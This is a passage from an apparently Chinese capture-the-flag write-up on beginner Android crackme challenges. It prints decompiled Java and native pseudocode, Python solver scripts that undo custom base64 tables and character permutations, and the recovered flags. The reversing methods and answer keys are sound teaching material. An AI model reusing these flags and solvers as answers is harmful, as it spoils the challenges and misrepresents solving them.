sQLiteDatabase.execSQL(&quot;create table TencentMicrMsg(name text,password integer,F_l_a_g text)&quot;); // 表TencentMicrMsg中三个字段分别是text、integer和text    }    public void onUpgrade(SQLiteDatabase sQLiteDatabase, int i, int i2) {    }}</code></pre><p>在包 a 下的 a 类，其中两个函数可以根据 b 类的函数分析得到功能：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome.a;/* compiled from: Cipher */public class a {    private String a = &quot;yaphetshan&quot;;    public String a(String str, String str2) {        String substring = str.substring(0, 4);        return substring + str2.substring(0, 4);    }    public String b(String str, String str2) { // 返回MD5十六进制字符串        b bVar = new b();        return b.a(str);    }    public String a(String str) { // 返回SHA1(str+&quot;yaphetshan&quot;)的十六进制字符串        b bVar = new b();        return b.b(str + this.a);    }}</code></pre><p>包 a 下的 b 类，根据 MessageDigest 创建的实例可以分别判断出是获取 MD5 和 SHA-1 的十六进制摘要：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome.a;import java.security.MessageDigest;/* compiled from: SHA1Manager */public class b {    public static final String a(String str) { // 获取MD5十六进制字符串        int i = 0;        char[] cArr = new char[]{&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;};        try {            byte[] bytes = str.getBytes();            MessageDigest instance = MessageDigest.getInstance(&quot;MD5&quot;);            instance.update(bytes);            byte[] digest = instance.digest(); // 获取MD5哈希摘要            int length = digest.length;            char[] cArr2 = new char[(length * 2)];            int i2 = 0;            while (i &lt; length) {                byte b = digest[i];                int i3 = i2 + 1;                cArr2[i2] = cArr[(b &gt;&gt;&gt; 4) &amp; 15];                i2 = i3 + 1;                cArr2[i3] = cArr[b &amp; 15];                i++;            }            return new String(cArr2);        } catch (Exception e) {            return null;        }    }    public static final String b(String str) { // 获取SHA1十六进制字符串        int i = 0;        char[] cArr = new char[]{&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;};        try {            byte[] bytes = str.getBytes();            MessageDigest instance = MessageDigest.getInstance(&quot;SHA-1&quot;);            instance.update(bytes);            byte[] digest = instance.digest(); // 获取SHA1哈希摘要            int length = digest.length;            char[] cArr2 = new char[(length * 2)];            int i2 = 0;            while (i &lt; length) {                byte b = digest[i];                int i3 = i2 + 1;                cArr2[i2] = cArr[(b &gt;&gt;&gt; 4) &amp; 15];                i2 = i3 + 1;                cArr2[i3] = cArr[b &amp; 15];                i++;            }            return new String(cArr2);        } catch (Exception e) {            return null;        }    }}</code></pre><p>那么根据上面的分析可以正向地得到密码：</p><pre><code class="python">#!/usr/bin/env pythonimport hashlibmd5hash = lambda m: hashlib.md5(m).hexdigest()sha1hash = lambda m: hashlib.sha1(m).hexdigest()name = &quot;Stranger&quot;password = &quot;123456&quot;a = name[:4] + password[:4]database = sha1hash(a + md5hash(a) + &quot;yaphetshan&quot;)[:7]print database# ae56f99</code></pre><p>打开 Decypt.db 库，查看表中数据：</p><p><img src="/pics/攻防世界-MOBILE-新手练习区/1.png" srcset="/img/loading.gif" alt></p><p>将字段中的字符串解 base64：</p><pre><code class="bash">$ echo &quot;VGN0ZntIM2xsMF9Eb19ZMHVfTG92M19UZW5jM250IX0=&quot; | base64 -DTctf{H3ll0_Do_Y0u_Lov3_Tenc3nt!}</code></pre><h1 id="easy-apk"><a href="#easy-apk" class="headerlink" title="easy-apk"></a>easy-apk</h1><p>把 apk 拖进 jadx，反编译查看入口事件代码，判断出对输入进行了 Base64 加密：</p><pre><code class="java">package com.testjava.jack.pingan1;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity {    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        ((Button) findViewById(R.id.button)).setOnClickListener(new OnClickListener() {            public void onClick(View view) {                if (new Base64New().Base64Encode(((EditText) MainActivity.this.findViewById(R.id.editText)).getText().toString().getBytes()).equals(&quot;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&quot;)) {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u901a\u8fc7!&quot;, 1).show(); // 验证通过!                } else {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u5931\u8d25!&quot;, 1).show(); // 验证失败!                }            }        });    }}</code></pre><p>再看看 Base64New 类中代码，发现是一个换表的 base64：</p><pre><code class="java">package com.testjava.jack.pingan1;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;public class Base64New {    private static final char[] Base64ByteToStr = new char[]{&#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;y&#39;, &#39;z&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;Z&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;8&#39;, &#39;9&#39;, &#39;+&#39;, &#39;/&#39;};    private static final int RANGE = 255;    private static byte[] StrToBase64Byte = new byte[AccessibilityNodeInfoCompat.ACTION_CLEAR_ACCESSIBILITY_FOCUS];    public String Base64Encode(byte[] bytes) {        StringBuilder res = new StringBuilder();        for (int i = 0; i &lt;= bytes.length - 1; i += 3) {            int k;            byte[] enBytes = new byte[4];            byte tmp = (byte) 0;            for (k = 0; k &lt;= 2; k++) {                if (i + k &lt;= bytes.length - 1) {                    enBytes[k] = (byte) (((bytes[i + k] &amp; RANGE) &gt;&gt;&gt; ((k * 2) + 2)) | tmp);                    tmp = (byte) ((((bytes[i + k] &amp; RANGE) &lt;&lt; (((2 - k) * 2) + 2)) &amp; RANGE) &gt;&gt;&gt; 2);                } else {                    enBytes[k] = tmp;                    tmp = (byte) 64;                }            }            enBytes[3] = tmp;            for (k = 0; k &lt;= 3; k++) {                if (enBytes[k] &lt;= (byte) 63) {                    res.append(Base64ByteToStr[enBytes[k]]);                } else {                    res.append(&#39;=&#39;);                }            }        }        return res.toString();    }}</code></pre><p>直接改表解码：</p><pre><code class="python">#!/usr/bin/env python#-*- encoding=utf-8 -*-from utils import *base64_charset = &#39;vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/=&#39;ciphertext = &#39;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&#39;plaintext = decipher(ciphertext)print plaintext# 05397c42f9b6da593a3644162d36eb01</code></pre><h1 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h1><p>jadx 反编译，MainActivity 中看到主要是 <code>b()</code> 函数判断了 flag 的格式，下面主要是把 a 和 b 两个类的构造函数理清：</p><pre><code class="java">package com.a.easyjava;import android.os.Bundle;import android.support.v7.app.c;import android.view.View;import android.view.View.OnClickListener;import android.widget.EditText;import android.widget.Toast;import java.util.Timer;import java.util.TimerTask;public class MainActivity extends c {    private static char a(String str, b bVar, a aVar) {        return aVar.a(bVar.a(str));    }    private static Boolean b(String str) {        int i = 0;        if (!str.startsWith(&quot;flag{&quot;)) {            return Boolean.valueOf(false);        }        if (!str.endsWith(&quot;}&quot;)) {            return Boolean.valueOf(false);        }        String substring = str.substring(5, str.length() - 1);        b bVar = new b(Integer.valueOf(2));        a aVar = new a(Integer.valueOf(3));        StringBuilder stringBuilder = new StringBuilder();        int i2 = 0;        while (i &lt; substring.length()) {            stringBuilder.append(a(substring.charAt(i) + &quot;&quot;, bVar, aVar));            Integer valueOf = Integer.valueOf(bVar.b().intValue() / 25); // 将bVar中d的值除以25并赋值给valueOf            if (valueOf.intValue() &gt; i2 &amp;&amp; valueOf.intValue() &gt;= 1) {                i2++;            }            i++;        }        return Boolean.valueOf(stringBuilder.toString().equals(&quot;wigwrkaugala&quot;));    }    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        findViewById(R.id.button).setOnClickListener(new OnClickListener(this) {            final /* synthetic */ MainActivity b;            public void onClick(View view) {                if (MainActivity.b(((EditText) ((MainActivity) this).findViewById(R.id.edit)).getText().toString()).booleanValue()) {                    Toast.makeText(this, &quot;You are right!&quot;, 1).show();                    return;                }                Toast.makeText(this, &quot;You are wrong! Bye~&quot;, 1).show();                new Timer().schedule(new TimerTask(this) {                    final /* synthetic */ AnonymousClass1 a;                    {                        this.a = r1;                    }                    public void run() {                        System.exit(1);                    }                }, 2000);            }        });    }}</code></pre><p>a 类的构造函数，是对数组 c 的重新排列。然后在 <code>a()</code> 函数中对输入的数字和下标进行转换：</p><pre><code class="java">package com.a.easyjava;import java.util.ArrayList;public class a {    public static ArrayList&lt;Integer&gt; a = new ArrayList();    static String b = &quot;abcdefghijklmnopqrstuvwxyz&quot;;    static Integer d = Integer.valueOf(0);    Integer[] c = new Integer[]{Integer.valueOf(7), Integer.valueOf(14), Integer.valueOf(16), Integer.valueOf(21), Integer.valueOf(4), Integer.valueOf(24), Integer.valueOf(25), Integer.valueOf(20), Integer.valueOf(5), Integer.valueOf(15), Integer.valueOf(9), Integer.valueOf(17), Integer.valueOf(6), Integer.valueOf(13), Integer.valueOf(3), Integer.valueOf(18), Integer.valueOf(12), Integer.valueOf(10), Integer.valueOf(19), Integer.valueOf(0), Integer.valueOf(22), Integer.valueOf(2), Integer.valueOf(11), Integer.valueOf(23), Integer.valueOf(1), Integer.valueOf(8)};    public a(Integer num) {        int intValue;        for (intValue = num.intValue(); intValue &lt; this.c.length; intValue++) {            a.add(this.c[intValue]);        }        for (intValue = 0; intValue &lt; num.intValue(); intValue++) {            a.add(this.c[intValue]);        }    }    public static void a() {        Integer num = d;        d = Integer.valueOf(d.intValue() + 1); // 将d加一        if (d.intValue() == 25) { // 判断d是否等于25            int intValue = ((Integer) a.get(0)).intValue();            a.remove(0);            a.add(Integer.valueOf(intValue)); // 将a的第一个元素添加到最后一位            d = Integer.valueOf(0); // 将d设置成0        }    }    public char a(Integer num) {        int i = 0;        Integer valueOf = Integer.valueOf(0);        if (num.intValue() == -10) { // 判断num是否为-10            a();            return &quot; &quot;.charAt(0);        }        while (i &lt; a.size() - 1) {            if (a.get(i) == num) {                valueOf = Integer.valueOf(i); // 获取a中等于num的元素，并将valueOf设置成其下标i            }            i++;        }        a();        return b.charAt(valueOf.intValue()); // 返回下标对应的b中的字符    }}</code></pre><p>b 类中同理，也是对下标的一个转换：</p><pre><code class="java">package com.a.easyjava;import java.util.ArrayList;public class b {    public static ArrayList&lt;Integer&gt; a = new ArrayList();    static String b = &quot;abcdefghijklmnopqrstuvwxyz&quot;;    static Integer d = Integer.valueOf(0);    Integer[] c = new Integer[]{Integer.valueOf(8), Integer.valueOf(25), Integer.valueOf(17), Integer.valueOf(23), Integer.valueOf(7), Integer.valueOf(22), Integer.valueOf(1), Integer.valueOf(16), Integer.valueOf(6), Integer.valueOf(9), Integer.valueOf(21), Integer.valueOf(0), Integer.valueOf(15), Integer.valueOf(5), Integer.valueOf(10), Integer.valueOf(18), Integer.valueOf(2), Integer.valueOf(24), Integer.valueOf(4), Integer.valueOf(11), Integer.valueOf(3), Integer.valueOf(14), Integer.valueOf(19), Integer.valueOf(12), Integer.valueOf(20), Integer.valueOf(13)};    public b(Integer num) {        int intValue;        for (intValue = num.intValue(); intValue &lt; this.c.length; intValue++) {            a.add(this.c[intValue]);        }        for (intValue = 0; intValue &lt; num.intValue(); intValue++) {            a.add(this.c[intValue]);        }    }    public static void a() {        int intValue = ((Integer) a.get(0)).intValue();        a.remove(0);        a.add(Integer.valueOf(intValue)); // 将a的第一个元素添加到最后一位        b += &quot;&quot; + b.charAt(0);        b = b.substring(1, 27); // 将b的第一个元素添加到最后一位        Integer num = d;        d = Integer.valueOf(d.intValue() + 1); // 将d加一    }    public Integer a(String str) {        int i = 0;        Integer valueOf = Integer.valueOf(0);        if (b.contains(str.toLowerCase())) { // 判断字符串是否在“abcdefghijklmnopqrstuvwxyz”中            Integer valueOf2 = Integer.valueOf(b.indexOf(str)); // str在b中的起始下标            while (i &lt; a.size() - 1) {                if (a.get(i) == valueOf2) { // 获取a中与valueOf2相等的值，并设置valueOf为其下标i                    valueOf = Integer.valueOf(i);                }                i++;            }        } else {            valueOf = str.contains(&quot; &quot;) ? Integer.valueOf(-10) : Integer.valueOf(-1); // 判断字符串中是否有空格，如果有valueOf设置成-10，反之设置成-1        }        a();        return valueOf;    }    public Integer b() {        return d;    }}</code></pre><p>其中有很多条件判断不可能发生，实际的算法逻辑没有反编译出的代码这么复杂。逆向实现脚本：</p><pre><code class="python">#!/usr/bin/env pythonbArray = [17, 23, 7, 22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13, 8, 25]aArray = [21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7, 14, 16]ciphertext = &#39;wigwrkaugala&#39;table = &#39;abcdefghijklmnopqrstuvwxyz&#39;valueOfArray = []for i in range(len(ciphertext)):    valueOfArray.append(table.index(ciphertext[i]))print valueOfArraynumArray = []for i in range(len(valueOfArray)):    numArray.append(aArray[valueOfArray[i]])print numArrayprefix = &#39;flag{&#39;suffix = &#39;}&#39;substring = &#39;&#39;for i in range(len(numArray)):    ch = table[bArray[numArray[i]]]    substring += ch    bArray.append(bArray[0])    del bArray[0]    table = (table + table[0])[1:27]flag = prefix + substring + suffixprint flag</code></pre><h1 id="easyjni"><a href="#easyjni" class="headerlink" title="easyjni"></a>easyjni</h1><p>反编译，其中调用了 a 函数，其中调用了 a 类中的 a 函数和在 libnative.so 实现的 ncheck 函数：</p><pre><code class="java">package com.a.easyjni;import android.os.Bundle;import android.support.v7.app.c;import android.view.View;import android.view.View.OnClickListener;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends c {    static {        System.loadLibrary(&quot;native&quot;);    }    private boolean a(String str) {        try {            return ncheck(new a().a(str.getBytes()));        } catch (Exception e) {            return false;        }    }    private native boolean ncheck(String str);    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        findViewById(R.id.button).setOnClickListener(new OnClickListener(this) {            final /* synthetic */ MainActivity b;            public void onClick(View view) {                if (this.b.a(((EditText) ((MainActivity) this).findViewById(R.id.edit)).getText().toString())) {                    Toast.makeText(this, &quot;You are right!&quot;, 1).show();                } else {                    Toast.makeText(this, &quot;You are wrong! Bye~&quot;, 1).show();                }            }        });    }}</code></pre><p>a 类里的 a 函数很容易发现是个换表 base64：</p><pre><code class="java">package com.a.easyjni;public class a {    private static final char[] a = new char[]{&#39;i&#39;, &#39;5&#39;, &#39;j&#39;, &#39;L&#39;, &#39;W&#39;, &#39;7&#39;, &#39;S&#39;, &#39;0&#39;, &#39;G&#39;, &#39;X&#39;, &#39;6&#39;, &#39;u&#39;, &#39;f&#39;, &#39;1&#39;, &#39;c&#39;, &#39;v&#39;, &#39;3&#39;, &#39;n&#39;, &#39;y&#39;, &#39;4&#39;, &#39;q&#39;, &#39;8&#39;, &#39;e&#39;, &#39;s&#39;, &#39;2&#39;, &#39;Q&#39;, &#39;+&#39;, &#39;b&#39;, &#39;d&#39;, &#39;k&#39;, &#39;Y&#39;, &#39;g&#39;, &#39;K&#39;, &#39;O&#39;, &#39;I&#39;, &#39;T&#39;, &#39;/&#39;, &#39;t&#39;, &#39;A&#39;, &#39;x&#39;, &#39;U&#39;, &#39;r&#39;, &#39;F&#39;, &#39;l&#39;, &#39;V&#39;, &#39;P&#39;, &#39;z&#39;, &#39;h&#39;, &#39;m&#39;, &#39;o&#39;, &#39;w&#39;, &#39;9&#39;, &#39;B&#39;, &#39;H&#39;, &#39;C&#39;, &#39;M&#39;, &#39;D&#39;, &#39;p&#39;, &#39;E&#39;, &#39;a&#39;, &#39;J&#39;, &#39;R&#39;, &#39;Z&#39;, &#39;N&#39;};    public String a(byte[] bArr) {        StringBuilder stringBuilder = new StringBuilder();        for (int i = 0; i &lt;= bArr.length - 1; i += 3) {            byte[] bArr2 = new byte[4];            byte b = (byte) 0;            for (int i2 = 0; i2 &lt;= 2; i2++) {                if (i + i2 &lt;= bArr.length - 1) {                    bArr2[i2] = (byte) (b | ((bArr[i + i2] &amp; 255) &gt;&gt;&gt; ((i2 * 2) + 2)));                    b = (byte) ((((bArr[i + i2] &amp; 255) &lt;&lt; (((2 - i2) * 2) + 2)) &amp; 255) &gt;&gt;&gt; 2);                } else {                    bArr2[i2] = b;                    b = (byte) 64;                }            }            bArr2[3] = b;            for (int i3 = 0; i3 &lt;= 3; i3++) {                if (bArr2[i3] &lt;= (byte) 63) {                    stringBuilder.append(a[bArr2[i3]]);                } else {                    stringBuilder.append(&#39;=&#39;);                }            }        }        return stringBuilder.toString();    }}</code></pre><p>查看 native 层 ncheck 函数，是静态注册的。理一下发现是个简单的置换：</p><pre><code class="cpp">signed int __fastcall Java_com_a_easyjni_MainActivity_ncheck(_JNIEnv *a1, int a2, jstring a3){  int v3; // r8  _JNIEnv *env; // r5  jstring str; // r8  const char *utf_string; // r6  int i; // r0  char *v8; // r2  char v9; // r1  int j; // r0  bool v11; // nf  unsigned __int8 v12; // vf  int v13; // r1  signed int result; // r0  char s1[32]; // [sp+3h] [bp-35h]  char tmp; // [sp+23h] [bp-15h]  int v17; // [sp+28h] [bp-10h]  v17 = v3;  env = a1;  str = a3;  utf_string = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, a3, 0);  if ( strlen(utf_string) == 32 )               // len(str) == 32  {    i = 0;    do    {      v8 = &amp;s1[i];      s1[i] = utf_string[i + 16];               // s1[i] = str[i + 16]      v9 = utf_string[i++];      v8[16] = v9;                              // s1[i + 16] = str[i]    }    while ( i != 16 );    env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, str, utf_string);    j = 0;    do    {      v12 = __OFSUB__(j, 30);      v11 = j - 30 &lt; 0;      tmp = s1[j];      s1[j] = s1[j + 1];      s1[j + 1] = tmp;                          // s1[j], s1[j + 1] = s1[j + 1], s1[j]      j += 2;    }    while ( v11 ^ v12 );                        // while j &lt;= 30    v13 = memcmp(s1, &quot;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&quot;, 0x20u);    result = 0;    if ( !v13 )      result = 1;  }  else  {    env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, str, utf_string);    result = 0;  }  return result;}</code></pre><p>逆向把位置颠倒的字符串倒回去，再用改表的 base64 解码：</p><pre><code class="python">#!/usr/bin/env pythonfrom base64 import *base64_charset = &#39;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN=&#39;ciphertext = &#39;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&#39;ciphertext = [ord(c) for c in ciphertext]for i in range(len(ciphertext) / 2):    ciphertext[2 * i], ciphertext[2 * i + 1] = ciphertext[2 * i + 1], ciphertext[2 * i]print ciphertextfor i in range(len(ciphertext) / 2):    ciphertext[i], ciphertext[i + 16] = ciphertext[i + 16], ciphertext[i]print ciphertextciphertext = &#39;&#39;.join([chr(c) for c in ciphertext])print ciphertext# QAoOQMPFks1BsB7cbM3TQsXg30i9g3==plaintext = decipher(ciphertext)print plaintext# flag{just_ANot#er_@p3}</code></pre><h1 id="easy-so"><a href="#easy-so" class="headerlink" title="easy-so"></a>easy-so</h1><p>用 jadx 反编译后，看到调用了 cyberpeace 类中的 CheckString 函数：</p><pre><code class="java">package com.testjava.jack.pingan2;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity {    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        ((Button) findViewById(R.id.button)).setOnClickListener(new OnClickListener() {            public void onClick(View v) {                if (cyberpeace.CheckString(((EditText) MainActivity.this.findViewById(R.id.editText)).getText().toString()) == 1) {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u901a\u8fc7!&quot;, 1).show(); // 验证通过!                } else {                    Toast.makeText(MainActivity.this, &quot;\u9a8c\u8bc1\u5931\u8d25!&quot;, 1).show(); // 验证失败!                }            }        });    }}</code></pre><p>看到函数在 Native 层实现：</p><pre><code class="java">package com.testjava.jack.pingan2;public class cyberpeace {    public static native int CheckString(String str);    static {        System.loadLibrary(&quot;cyberpeace&quot;);    }}</code></pre><p>发现是静态实现的函数，其中将输入调用了 TestDec，并将结果和指定字符串比较：</p><pre><code class="cpp">signed int __fastcall Java_com_testjava_jack_pingan2_cyberpeace_CheckString(_JNIEnv *a1, int a2, jstring *str){  signed int v3; // r8  const char *str_1; // r9  int v5; // r6  const char *v6; // r5  signed int v7; // r1  v3 = 0;  str_1 = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, str, 0);  v5 = strlen(str_1);  v6 = (const char *)malloc(v5 + 1);  v7 = 0;  if ( v5 != -1 )    v7 = 1;  _aeabi_memclr(&amp;v6[v5], v7);  _aeabi_memcpy((int)v6, (int)str_1, v5);  j_TestDec((int)v6);  if ( !strcmp(v6, &quot;f72c5a36569418a20907b55be5bf95ad&quot;) )    v3 = 1;  return v3;}</code></pre><p>看一下 TestDec 发现和之前一样，也是一组简单置换：</p><pre><code class="cpp">size_t __fastcall TestDec(const char *a1){  char *str; // r4  size_t i; // r5  char *v3; // r1  char v4; // r0  size_t result; // r0  int j; // r5  char *v7; // r0  char v8; // r1  unsigned int v9; // r1  str = (char *)a1;  if ( strlen(a1) &gt;= 2 )  {    i = 0;    do    {      v3 = &amp;str[i];      v4 = str[i];      str[i] = str[i + 16];      ++i;      v3[16] = v4;                              // str[i], str[i + 16] = str[i + 16], str[i]    }    while ( i &lt; strlen(str) &gt;&gt; 1 );  }  result = (unsigned __int8)*str;  if ( !*str )    return result;  *str = str[1];  str[1] = result;                              // str[0], str[1] = str[1], str[0]  result = strlen(str);  if ( result &lt; 3 )    return result;  j = 0;  do  {    v7 = &amp;str[j];    v8 = str[j + 2];    v7[2] = str[j + 3];    v7[3] = v8;                                 // str[j + 2], str[j + 3] = str[j + 3], str[j + 2]    result = strlen(str);    v9 = j + 4;    j += 2;  }  while ( v9 &lt; result );  return result;}</code></pre><p>照样学样逆一下就好了：</p><pre><code class="python">#!/usr/bin/env pythonciphertext = &#39;f72c5a36569418a20907b55be5bf95ad&#39;ciphertext = [ord(c) for c in ciphertext]ciphertext[0], ciphertext[1] = ciphertext[1], ciphertext[0]for i in range(len(ciphertext) / 2 - 1):    ciphertext[2 * i + 2], ciphertext[2 * i + 3] = ciphertext[2 * i + 3], ciphertext[2 * i + 2]print ciphertextfor i in range(len(ciphertext) / 2):    ciphertext[i], ciphertext[i + 16] = ciphertext[i + 16], ciphertext[i]print ciphertextplaintext = &#39;&#39;.join([chr(c) for c in ciphertext])print plaintext# 90705bb55efb59da7fc2a5636549812a</code></pre><h1 id="Ph0en1x-100"><a href="#Ph0en1x-100" class="headerlink" title="Ph0en1x-100"></a>Ph0en1x-100</h1><p>MainActivity 中，encrypt 和 getFlag 函数在 Native 层实现，getSecret 函数返回某种哈希摘要的十六进制字符串。输入经过 encrypt 函数操作后的值与 getFlag 的值相等：</p><pre><code class="java">package com.ph0en1x.android_crackme;import android.os.Bundle;import android.support.v4.view.MotionEventCompat;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.widget.EditText;import android.widget.Toast;import java.io.UnsupportedEncodingException;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;public class MainActivity extends AppCompatActivity {    EditText etFlag;    public native String encrypt(String str);    public native String getFlag();    static {        System.loadLibrary(&quot;phcm&quot;);    }    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        this.etFlag = (EditText) findViewById(R.id.flag_edit);    }    public void onGoClick(View v) {        if (getSecret(getFlag()).equals(getSecret(encrypt(this.etFlag.getText().toString())))) {            Toast.makeText(this, &quot;Success&quot;, 1).show();        } else {            Toast.makeText(this, &quot;Failed&quot;, 1).show();        }    }    public String getSecret(String string) { // 获取某种哈希摘要的十六进制字符串        try {            byte[] hash = MessageDigest.getInstance(encrypt(&quot;KE3TLNE6M43EK4GM34LKMLETG&quot;).substring(5, 8)).digest(string.getBytes(&quot;UTF-8&quot;));            if (hash != null) {                StringBuilder hex = new StringBuilder(hash.length * 2);                for (byte b : hash) {                    if ((b &amp; MotionEventCompat.ACTION_MASK) &lt; 16) {                        hex.append(&quot;0&quot;);                    }                    hex.append(Integer.toHexString(b &amp; MotionEventCompat.ACTION_MASK));                }                return hex.toString();            }        } catch (NoSuchAlgorithmException e) {            e.printStackTrace();        } catch (UnsupportedEncodingException e2) {            e2.printStackTrace();        }        return null;    }}</code></pre><p>在 IDA 中看到静态注册的 encrypt 函数，对字符串的每个值进行了减一操作：</p><pre><code class="cpp">jstring __fastcall Java_com_ph0en1x_android_1crackme_MainActivity_encrypt(_JNIEnv *a1, int a2, jstring a3){  _JNIEnv *v3; // r6  const char *v4; // r4  const char *i; // r5  v3 = a1;  v4 = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, a3, 0);  for ( i = v4; i - v4 &lt; strlen(v4); ++i )    --*i;  return v3-&gt;functions-&gt;NewStringUTF(&amp;v3-&gt;functions, v4);}</code></pre><p>反向加一，得到指定的哈希摘要是 MD5：</p><pre><code class="python">#!/usr/bin/env pythonimport hashlibmd5hash = lambda m: hashlib.md5(m).hexdigest()secret_digest = &#39;KE3TLNE6M43EK4GM34LKMLETG&#39;digest_type = &#39;&#39;for i in range(len(secret_digest)):    digest_type += chr(ord(secret_digest[i]) - 1)digest_type = digest_type[5:8]print digest_type# MD5</code></pre><p>接下来看 getFlag 函数，读取内存中 data 的值，在循环中对相邻两个值进行相减并加 1，然后和 key 值异或，最后返回字符串：</p><pre><code class="cpp">jstring __fastcall Java_com_ph0en1x_android_1crackme_MainActivity_getFlag(_JNIEnv *a1){  char *v1; // r4  _JNIEnv *v2; // r7  char *v3; // r3  int v4; // r0  int v5; // r1  char *v6; // r2  char *v7; // r3  int v8; // r0  int v9; // r1  int v10; // r4  int v11; // r0  __int16 v12; // r3  signed int l1; // r8  signed int l2; // r0  char *v15; // r9  char a; // r3  char b; // t1  int idx; // r1  char s; // [sp+4h] [bp-5Ch]  char data_1[40]; // [sp+14h] [bp-4Ch]  char v22; // [sp+40h] [bp-20h]  v1 = data_1;  v2 = a1;  v3 = (char *)&amp;data;  do  {    v4 = *(_DWORD *)v3;                         // low 4 bytes    v3 += 8;    v5 = *((_DWORD *)v3 - 1);                   // high 4 bytes    *(_DWORD *)v1 = v4;    *((_DWORD *)v1 + 1) = v5;    v1 += 8;  }  while ( v3 != &quot;Hello Ph0en1x&quot; );  v6 = &amp;s;  v7 = &quot;Hello Ph0en1x&quot;;  do  {    v8 = *(_DWORD *)v7;    v7 += 8;    v9 = *((_DWORD *)v7 - 1);    *(_DWORD *)v6 = v8;    *((_DWORD *)v6 + 1) = v9;    v10 = (int)(v6 + 8);    v6 += 8;  }  while ( v7 != &quot;0en1x&quot; );  v11 = *(_DWORD *)v7;  v12 = *((_WORD *)v7 + 2);  *(_DWORD *)v10 = v11;  *(_WORD *)(v10 + 4) = v12;  l1 = strlen(&amp;s);                              // len(&#39;Hello Ph0en1x&#39;)  l2 = strlen(data_1) - 1;                      // len(data) - 1  v15 = &amp;data_1[l2];  while ( l2 &gt; 0 )  {    a = *v15 + 1;    *v15 = a;                                   // data[l2] = data[l2] + 1    b = *(v15-- - 1);                           // data[l2 - 1]    idx = l2-- % l1;                            // l2 % l1    v15[1] = ((a - b) ^ *(&amp;v22 + idx - 60)) - 1;// data[l2] = ((data[l2 + 1] - data[l2 - 1]) ^ s[idx]) - 1  }  data_1[0] = (data_1[0] ^ 0x48) - 1;  return v2-&gt;functions-&gt;NewStringUTF(&amp;v2-&gt;functions, data_1);}</code></pre><p>因为涉及到了异或和减法的操作，需要注意到及时和 0xFF 与一下，不然结果会出错。脚本：</p><pre><code class="python">data = [0x2E, 0x36, 0x42, 0x4C, 0x5F, 0xBF, 0xE0, 0x3A, 0xA8, 0xC3, 0x20, 0x63, 0x89, 0xB7, 0xC0, 0x1C, 0x1D, 0x44, 